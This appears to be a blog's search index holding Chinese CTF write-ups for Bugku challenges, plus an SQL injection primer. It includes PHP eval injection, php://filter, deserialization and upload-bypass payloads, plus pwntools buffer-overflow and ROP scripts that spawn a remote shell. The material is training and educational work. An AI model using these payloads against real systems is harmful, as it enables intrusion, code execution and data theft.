<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[bugku-Misc]]></title>
    <url>%2F2019%2F09%2F16%2Fbugku-Misc%2F</url>
    <content type="text"><![CDATA[闪的好快 下载文件是一个动态二维码，扫描第一帧之后会返回一个S，所以猜测就是所有二维码的字符串就是flag，所以写个脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#-*- coding: UTF-8 -*- import osimport requestsimport sysfrom io import BytesIOfrom pyzbar import pyzbarfrom PIL import Image,ImageEnhance def analyseImage(path): ''' Pre-process pass over the image to determine the mode (full or additive). Necessary as assessing single frames isn't reliable. Need to know the mode before processing all frames. ''' im = Image.open(path) results = &#123; 'size': im.size, 'mode': 'full', &#125; try: while True: if im.tile: tile = im.tile[0] update_region = tile[1] update_region_dimensions = update_region[2:] if update_region_dimensions != im.size: results['mode'] = 'partial' break im.seek(im.tell() + 1) except EOFError: pass return results def processImage(path): ''' Iterate the GIF, extracting each frame. ''' mode = analyseImage(path)['mode'] im = Image.open(path) i = 0 p = im.getpalette() last_frame = im.convert('RGBA') try: while True: print "saving %s (%s) frame %d, %s %s" % (path, mode, i, im.size, im.tile) ''' If the GIF uses local colour tables, each frame will have its own palette. If not, we need to apply the global palette to the new frame. ''' if not im.getpalette(): im.putpalette(p) new_frame = Image.new('RGBA', im.size) ''' Is this file a "partial"-mode GIF where frames update a region of a different size to the entire image? If so, we need to construct the new frame by pasting it on top of the preceding frames. ''' if mode == 'partial': new_frame.paste(last_frame) new_frame.paste(im, (0,0), im.convert('RGBA')) new_frame.save('%s-%d.png' % (''.join(os.path.basename(path).split('.')[:-1]), i), 'PNG') i += 1 last_frame = new_frame im.seek(im.tell() + 1) except EOFError: pass def get_ewm(): """ 读取二维码的内容： img_adds：二维码地址（可以是网址也可是本地地址 """ for i in range(0,18): img_adds = "masterGO-"+str(i)+".png" #print(img_adds) if os.path.isfile(img_adds): # 从本地加载二维码图片 img = Image.open(img_adds) else: # 从网络下载并加载二维码图片 rq_img = requests.get(img_adds).content img = Image.open(BytesIO(rq_img)) # img.show() # 显示图片，测试 txt_list = pyzbar.decode(img) for txt in txt_list: barcodeData = txt.data.decode("utf-8") sys.stdout.write(barcodeData) def main(): #先将gif分解为单帧 #processImage('masterGO.gif') get_ewm() print("\n") if __name__ == "__main__": main() 得到flag:SYC{F1aSh_so_f4sT}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku_web]]></title>
    <url>%2F2019%2F08%2F04%2FBugku-web%2F</url>
    <content type="text"><![CDATA[Web2打开链接： 查看源码，查找flag KEY{Web-2-bugKssNNikls9100} 计算器打开链接，发现只能输入一位 按f12打开控制台，查看相关源代码，发现maxlen=1，将其改为2， 重新输入，结果21即可得到flag{CTF-bugku-0032} ##web基础$_GET 打开链接,发现以下代码： 1234$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 很简单就是用GET方法进行传值，注意在index.php界面进行传值，payload如下： http://123.206.87.240:8002/get/index.php?what=flag 得到flag{bugku_get_su8kej2en} web基础$_POST跟上题很像，只是传参方法换了，使用POST方法，使用hackbar，直接传参： 得到flag{bugku_get_ssseint67se} 矛盾打开链接，得到这个: 1234567$num=$_GET['num'];if(!is_numeric($num)) //num不能是个数字&#123;echo $num;if($num==1) //num需要等于1echo 'flag&#123;**********&#125;';&#125; ==是比较运算符号 不会检查条件式的表达式的类型，所以我们可以构造一组整数等于1的字符串payload如下：http://123.206.87.240:8002/get/index1.php?num=1s 得到flag{bugku-789-ps-ssdf} web3打开链接： 查看源码。发现一组编码： &amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; unicode编码，解码得到KEY{J2sa42ahJK-HS11III} 域名解析 直接添加hosts文件，在尾部加上123.206.87.240 flag.baidu.com 在浏览器中输入：flag.baidu.com得到KEY{DSAHDSJ82HDS2211} 你必须让他停下打开链接，发现： 看源码，会发现图片一直在变，在这个页面一直刷新就行，就能得到flag 本地包含123456&lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__); ?&gt; 方法一：eval存在命令执行漏洞，使用hello构造payloadhttp://123.206.87.240:8003/index.php?hello=1);show_source(%27flag.php%27);var_dump(3 12345678910int(1) &lt;?php $flag = 'Too Young Too Simple'; # echo $flag; # flag&#123;bug-ctf-gg-99&#125;; ?&gt; int(3) &lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__); ?&gt; 方法二：http://123.206.87.240:8003/index.php?hello=1);include $_POST[&#39;f&#39;]; 在POST区域：f=php://filter/convert.base64-encode/resource=flag.php 方法三：直接将flag.php文件读入变量hello中?hello=get_file_contents(&#39;flag.php&#39;) 备份是个好习惯利用md5或者php中“==”的漏洞进行操作 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str); //用空串覆盖key所以需要构造两个重复parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 关键代码就是需要key1与key2的值相等，但是加密之前的值不同 md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的 1http://123.206.87.240:8002/web16?kkeyey1[]=something&amp;kkeyey2[]=nothing 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 1234567891011121314下列的字符串的MD5值都是0e开头的：QNKCDZO240610708s878926199as155964671as214587387as214587387ahttp://123.206.87.240:8002/web16?kkeyey1=QNKCDZO&amp;kkeyey2=240610708 秋名山老司机2s秒内需要计算出结果然后post value值上去，可以用脚本进行计算 123456789101112import requestsimport reurl='http://123.206.87.240:8002/qiumingshan/'r=requests.session()requestpage = r.get(url)ans = re.findall('&lt;div&gt;(.*?)=\?;&lt;/div&gt;', requestpage.text) #获取表达式#print("ans",ans)ans="".join(ans)#列表转为字符串post=eval(ans)#计算表达式的值data=&#123;'value':post&#125;#构造post的data部分flag=r.post(url,data=data)print(flag.text) 得到flag: Bugku{YOU_DID_IT_BY_SECOND} 速度要快 看看源代码，需要我们post一个margin值上去 尝试抓包，发送repeater一下，然后go，发现flag，base64解密 交上去，发现不对，然后将margin赋值，用post方法传上去，发现也不对，再go几次发现，flag值在变化..…..… 想想题目说速度要快，所以可能需要通过脚本进行传值 12345678910import requestsimport base64url="http://123.206.87.240:8002/web6/"r=requests.session()headers=r.get(url).headers #获取headermid=base64.b64decode(headers['flag'])mid=mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的flag = base64.b64decode(mid.split(':')[1])#获得flag:后的值data=&#123;'margin':flag&#125;print (r.post(url,data).text)#post方法传上去 cookie欺骗 打开看是一堆字符串，而且是一组重复出现，尝试MD5解密，没有结果。之后看看url http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= filename后的好像是base64编码，尝试解码：keys.txt 也就是说我们可以通过filename来得到文件信息,而我们想得到flag可以尝试看一下后台index.php的源码，同样需要将iindex.php编码,用line控制行数可将其打印出。 http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw 使用脚本 12345import requestsfor i in range(30): url = "http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s = requests.get(url) print(s.text) 得到 123456789101112131415161718192021222324252627&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 我们可以尝试添加Cookie,然后将keys.php编码后传上去 得到flag:KEY{key_keys} nerve give up 还是看看源码： 所以访问下http://123.206.87.240:8006/test/1p.html 1234567891011121314151617181920&lt;HTML&gt;&lt;HEAD&gt;&lt;SCRIPT LANGUAGE="Javascript"&gt;&lt;!--var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;/BODY&gt;&lt;/HTML&gt; 得到一组base64加密字符串，注意这里%3D%3D-–%3E是url加密，解密的是==--&gt; 所以直接进行base64解密得到： 1234567891011121314151617181920212223";if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')) #寻找.在a中第一次出现的位置&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt; 尝试直接访问f4l2a3g.txt文件，得到flag:flag{tHis_iS_THe_fLaG} welcome to bugkuctf打开链接，还是啥都没有，看看源代码 12345678910111213&lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; //user不为空且user=welcome to the bugkuctf echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到 “php://input”协议。大致的意思是让 txt=php://input ，之后在post过去一个字符串 http://123.206.87.240:8006/index.php?txt=php://input welcome to the bugkuctf //将其post上去 此时根据提示我们可以把包含的文件读出来了，这里要用到php的第二个伪协议：php://filter txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php（简单来说就是利用伪协议读取所包含文件的base64值） 123456789101112131415PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA== 解码：&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; //如果文件为空， echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 看看能不能直接读flag: 显然没有flag,所以不能直接访问。这个信息返回到index.php页面，所以讲hint.php改成index.php看看里面的信息。 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 我们发现当Flag方法当做字符串执行时，会自动执行 __tostring 方法，方法中写了如果file文件存在，那么就输出file文件中的内容。构造一个Flag类型的参数，并把这个参数传给password然后get进去。并且这个file的值要是hint.php（因为要利用hint.php中的函数） 12345678910&lt;?php class Flag&#123; public $file; &#125; $a = new Flag(); $a-&gt;file = "flag.php"; $a = serialize($a); print_r($a); ?&gt; O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 所以构造的url为：http://123.206.87.240:8006/index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 得到flag:flag{php_is_the_best_language} 字符？正则？ 利用正则匹配构造id的值，用GET方法传上去 12345678910111213/代表匹配的开始与结束两个/里面的内容就是要匹配的内容.代表数字匹配任意数字，*代表匹配0-n次两者结合.*就是匹配任一个数字任意次\表示要找\后面的内容，\/.\/就是找/数字/&#123;4,7&#125;表示匹配前一个字符4到7次[a-z]就是匹配a-z之间的字符[[:punct:]]代表任意标点i代表字体大小 前女友（SKCTF) 打开链接出现这个，查看源码， 点击一下，可以得到code.txt中的内容 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; //相等返回0，不相等返回非0值 echo $flag; &#125; &#125;&#125;?&gt; 跟前面一道题很像，绕过md5，这里需要说一下就是strcmp在比较数组的时候返回应该是0，所以url构造如下：http://123.206.31.85:49162/index.php?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=something 得到flag:SKCTF{Php_1s_tH3_B3St_L4NgUag3} login1(SKCTF) 随便注册一下，发现，无法登陆，发现可以注册账号，之后登陆发现需要获取管理员权限 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的 SELECT * FROM users WHERE username=&#39;vampire &#39;; 在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。 注意密码是大小字母还要加数字，还有admin后的空格需要足够多的。 我的注册是： 12admin 123QW123q 之后登陆就能得到flag:SKCTF{4Dm1n_HaV3_GreAt_p0w3R} 你从哪里来 伪造一下来源，改一下referer referer: https://www.google.com 得到flag{bug-ku_ai_admin} 目前遇到几个有关请求头的题，这里就稍微做一下总结 通用首部字段 请求首部字段 响应首部字段 md5 collision(NUPT_CTF) 根据题目所说，md5冲突，无非就是两个不同的值，但md5相等,所以先试试0e开头的 http://123.206.87.240:9009/md5.php?a=s878926199a 得到flag:flag{md5_collision_is_easy} 程序员本地网站 从本地访问，可以很清楚地看出，需要我们改一下X-Forwarded-For的值为：127.0.0.1 可以用burpsuite抓包，得到flag:flag{loc-al-h-o-st1} 各种绕过 打开链接会发现： 12345678910111213141516 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']); //url解码$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 首先id=urlencode(margin)=margin，uname不能和passwd相等，但是sha1之后要相等，sha1只对字符型进行处理，是数组的话返回false,注意是在index.php中传值。 所以payload:http://123.206.87.240:8002/web7/index.php?id=margin&amp;uname[]=something 还需要post：passwd[]=nothing 可以用hackbar完成操作，得到Flag: flag{HACK_45hhs_213sDD} web8 1234567891011121314151617&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));//trim() 函数移除字符串两侧的空白字符或其他预定义字符//file_get_contents() 函数把整个文件读入一个字符串中if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; 题目中提出有txt文件，尝试1.txt,index.txt,flag.txt，最后发现flag.txt中有文件， 所以payload:http://123.206.87.240:8002/web8/index.php?ac=flags&amp;fn=flag.txt 得到flag:flag{3cfb7a90fc0de31} 细心 打开链接发现这样的页面： 我还以为这道题又被大佬们给干掉了，看了别人的博客发现可以做，那就接着走..…..… 查看源码，什么也没有。怎么办？？用御剑扫一下后台吧 发现可以访问，robots.txt，打开看看 接着做 题目是想办法变成admin，所以试试下面这个payload=http://123.206.87.240:8002/web13/resusl.php?x=admin 得到flag:flag(ctf_0098_lkji-s) 求getshell 打开链接， 大佬说的，如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，这里将文件的后缀名改为.jpg和.png都不可行，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag 先传一张图片，进行抓包，然后修改下面两个地方： filename 改为 1.php5 消息头中的Content-type将其后随便一个字母改为大写]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku_pwn]]></title>
    <url>%2F2019%2F07%2F31%2FBugku-pwn%2F</url>
    <content type="text"><![CDATA[pwn1访问nc 114.116.54.89 10001 打印一下当前目录的文件，会发现： 直接 cat flag即可 flag{6979d853add353c9} PWN2 下载文件，看一下开了什么防护： 没有栈溢出防护，随机化地址也没有。 用ida打开看看： 发现这个文件存在shell，所以大概思路就是利用read函数溢出覆盖到getshell的位置，由于这是调用静态的链接库，所以相对位移是不变的，直接可以得到此时shell的位置 看看read函数中的参数s的数组大小： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152-0000000000000030 s db ?-000000000000002F db ? ; undefined-000000000000002E db ? ; undefined-000000000000002D db ? ; undefined-000000000000002C db ? ; undefined-000000000000002B db ? ; undefined-000000000000002A db ? ; undefined-0000000000000029 db ? ; undefined-0000000000000028 db ? ; undefined-0000000000000027 db ? ; undefined-0000000000000026 db ? ; undefined-0000000000000025 db ? ; undefined-0000000000000024 db ? ; undefined-0000000000000023 db ? ; undefined-0000000000000022 db ? ; undefined-0000000000000021 db ? ; undefined-0000000000000020 db ? ; undefined-000000000000001F db ? ; undefined-000000000000001E db ? ; undefined-000000000000001D db ? ; undefined-000000000000001C db ? ; undefined-000000000000001B db ? ; undefined-000000000000001A db ? ; undefined-0000000000000019 db ? ; undefined-0000000000000018 db ? ; undefined-0000000000000017 db ? ; undefined-0000000000000016 db ? ; undefined-0000000000000015 db ? ; undefined-0000000000000014 db ? ; undefined-0000000000000013 db ? ; undefined-0000000000000012 db ? ; undefined-0000000000000011 db ? ; undefined-0000000000000010 db ? ; undefined-000000000000000F db ? ; undefined-000000000000000E db ? ; undefined-000000000000000D db ? ; undefined-000000000000000C db ? ; undefined-000000000000000B db ? ; undefined-000000000000000A db ? ; undefined-0000000000000009 db ? ; undefined-0000000000000008 db ? ; undefined-0000000000000007 db ? ; undefined-0000000000000006 db ? ; undefined-0000000000000005 db ? ; undefined-0000000000000004 db ? ; undefined-0000000000000003 db ? ; undefined-0000000000000002 db ? ; undefined-0000000000000001 db ? ; undefined+0000000000000000 s db 8 dup(?)+0000000000000008 r db 8 dup(?)+0000000000000010+0000000000000010 ; end of stack variables 也就是说，覆盖0x30+0x8才能进入return,所以直接可以写脚本： 123456from pwn import *p = remote('114.116.54.89','10003')payload = 'a'*0x38+p64(0x400751)p.recvline()p.sendline(payload)p.interactive() flag{n0w_y0u_kn0w_the_Stack0verfl0w} PWN4下载文件，查看一下保护机制： 没有栈溢出防护，可执行，没有地址随机化，有代码可执行段。 在ida64中打开，先看看main函数： 1234567891011__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-10h] memset(&amp;s, 0, 0x10uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts("Come on,try to pwn me"); read(0, &amp;s, 0x30uLL); puts("So~sad,you are fail"); return 0LL;&#125; 没有栈溢出防护,而且有read函数，可以进行栈溢出，现在我们需要找到可以执行的shell位置， shift+F12 查看文件中的字符串，看看有没有可疑字符串: 里面发现存在system函数，以及敏感字$0 ，$0在linux中为为shell或shell脚本的名称。system()会调用fork()产生子进程，由子进程来调用/bin/sh -c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。 所以如果将$0作为system的参数，能达到传入&#39;/bin/sh&#39;一样的效果。 接着我们就可以开始传入参数，64位是利用寄存器进行传参，32位使用栈进行传参 这里我们需要找到pop | ret 来进行相应的赋值,利用ROPgadget: 1234567891011121314kali:Desktop # ROPgadget --binary pwn4 --only 'pop|ret'Gadgets information============================================================0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007d0 : pop r14 ; pop r15 ; ret0x00000000004007d2 : pop r15 ; ret0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400630 : pop rbp ; ret0x00000000004007d3 : pop rdi ; ret #选用这个0x00000000004007d1 : pop rsi ; pop r15 ; ret0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400541 : ret 这里注意一下原因：我们需要找出 pop | ret来进行传值，而上述只有rdi是可以存入数据，rbp和r15是called saved 然后我们还需要找到$0的位置和调用system函数的位置 1234kali:Desktop # ROPgadget --binary pwn4 --string '\$0'Strings information============================================================0x000000000060111f : $0 现在可以开始写脚本： 123456789101112from pwn import *p = remote('114.116.54.89','10004')pop_rdi = 0x00000000004007d3sys_addr = 0x40075Ash_addr = 0x000000000060111fpayload = 'a'*0x18 + p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)p.recvline()p.sendline(payload)p.interactive() 得到flag{264bc50112318cd6e1a67b0724d6d3af}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-Crypto]]></title>
    <url>%2F2019%2F07%2F30%2FBugku-Crypto%2F</url>
    <content type="text"><![CDATA[easy_crypto10010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101 打开链接，发现这样的一段字符串，可以看出是莫斯电码， ​ 根据上表进行相应的解码程序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#owner=houhuiting#type=abstractstring=input()key=string.split(" ")dictionary= &#123;'01': 'A', '1000': 'B', '1010': 'C', '100':'D', '0':'E', '0010':'F', '110': 'G', '0000': 'H', '00': 'I', '0111':'J', '101': 'K', '0100': 'L', '11': 'M', '10': 'N', '111': 'O', '0110': 'P', '1101': 'Q', '010': 'R', '000': 'S', '1': 'T', '001': 'U', '0001': 'V', '011': 'W', '1001': 'X', '1011': 'Y', '1100': 'Z', '01111': '1', '00111': '2', '00011': '3', '00001': '4', '00000': '5', '10000': '6', '11000': '7', '11100': '8', '11110': '9', '11111': '0', '001100': '?', '10010': '/', '101101': ')', '100001': '-', '010101': '.', '110011':',', '011010':'@', '111000':':', '101010':':', '10001':'=', '011110':"'", '101011':'!', '001101':'_', '010010':'"', '10110':'(', '1111011':'&#123;', '1111101':'&#125;' &#125;; for item in key:# print(dictionary[item],end='') print(dictionary[item].lower(),end='') 解出flag:FLAG{M0RSE_CODE_1S_INTEREST1N9!} 但是交上去是错的，换成小写试试，flag{m0rse_code_1s_interest1n9!}成功 散乱的密文 lf5{ag024c483549d7fd@@1}一张纸条上凌乱的写着2 1 6 5 3 4 2 1 6 5 3 4 l f 5 { a g 0 2 4 c 4 8 3 5 4 9 d 7 f d @ @ 1 } 按照上述顺序弄出，得到flag{52048c453d794df1} ps: 将后面两个@@去掉 凯撒部长的奖励给出一串字符串： 1MSW&#123;byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om&#125; 直接凯撒解密: 1SYC&#123;here_Is_yOur_rEwArd_enjOy_It_Caesar_or_call_him_vIctOr_is_a_Excellent_man_if_you_want_to_get_his_informations_you_can_join_us&#125;]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入入门]]></title>
    <url>%2F2019%2F07%2F25%2FSQL%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[判断有无引号 根据字段的意义或输入的值 Name/可以输入字母或符号 Id/输入是数字 运算测试id=2-1 结果与id=1一样，说明2-1被执行，没有被引号包裹 结果与id=2一样，说明2-1被当做字符串先进行了类型转换，再执行，有引号 判断单双引号 一般来说可以直接用转义字符进行判断 ps:上面这个bugku上的成绩单一题是利用post进行传值 这里的后台就可以认为是单引号 1Select * from table1 where id = ‘$id’ Union进行注入 将两个或多个查询的结果合并到一个结果集中。 所有查询中的列数和列的顺序必须相同。数据类型必须兼容。 确定列数 方法一：union select 1,2,3…，尝试到报错之前的那个数就是列数 方法二：order by 1..…，也是尝试到报错之前的那个数就是列数 确定显示字段1234//mysql中一些基础知识1. -- 与后面的这个单引号连接在一起，无法形成有效的mysql语句2. --+ 加号与上面的区别就是多了一个空格符，-- -也有一样的效果3. # 会注释掉后面的语句 information_schema这个数据库存放的是数据库和数据表的元信息 看数据库 1select schema_name from information_schema.schemata; 看表名 1select table_name from information_schema.tables; 看列名 1select column_name from information_schema.columns; 12#格式select group_concat(column_name) from information_schema.columns where table_name=‘xxx’/0x…; 根据已知信息查数据 Select group_concat(列名) from 数据库名.表名; Sqlmap -–dbs 枚举数据库管理系统数据库 -–tables 枚举的 DBMS 数据库中的表 -T 指定 -–columns 枚举 DBMS 数据库表列 -C 指定 -–dump 转储数据库管理系统的数据库中的表项 报错注入updatexml UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc； 第二个参数：XPath_string (Xpath格式的字符串)。 第三个参数：new_value，是String格式，替换查找到的符合条件的数据。 利用的关键是，updatexml第二个参数需要的是Xpath格式的字符串。如果输入的不符合Xpath格式，将会发生错误。 extractvalue extractvalue函数与updatexml函数基本相同 ，区别在于extractvalue仅有两个参数。 EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 。 第二个参数：XPath_string 